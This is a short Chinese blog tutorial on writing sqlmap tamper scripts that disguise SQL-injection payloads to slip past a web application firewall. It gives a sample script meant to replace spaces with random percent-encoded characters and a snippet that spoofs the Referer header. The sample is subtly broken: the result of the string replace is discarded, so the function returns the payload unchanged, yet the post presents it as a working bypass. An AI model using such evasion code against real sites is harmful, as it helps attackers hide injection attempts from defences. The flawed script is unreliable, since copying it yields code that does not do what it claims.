---
title: "SQLMap Tamper 编写"
date: 2018-05-12T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['sqli','python']
categories: ['Web安全']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


sqlmap 是一个开源的渗透测试工具, 可以用来自动化的检测, 利用 SQL 注入漏洞, 获取数据库服务器的权限.

<!--more-->

在 sqlmap 的 tamper 中, 需要实现的地方有 3 处.

```
__priority__ - 脚本优先级
dependencies - 适用/不适用的范围
tamper - 用于 bypass waf
```

dependencies 一般不用设置, __priority__ 默认为 PRIORITY.LOW 即可

# bypass

拿之前遇到的 waf 举个例子

```
import random
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    fuzz = ('0','1','2','3','4','5','6','7','8','9')
    for _ in range(len(payload.split(' '))-1):
        string = r'%' + random.choice(fuzz) + random.choice(fuzz)
        payload.replace(' ',string,1)
    return payload
```

# Other

kwargs 更改 header

```
headers = kwargs.get('headers', {})
headers['Referer'] = 'http://www.baidu.com/'
```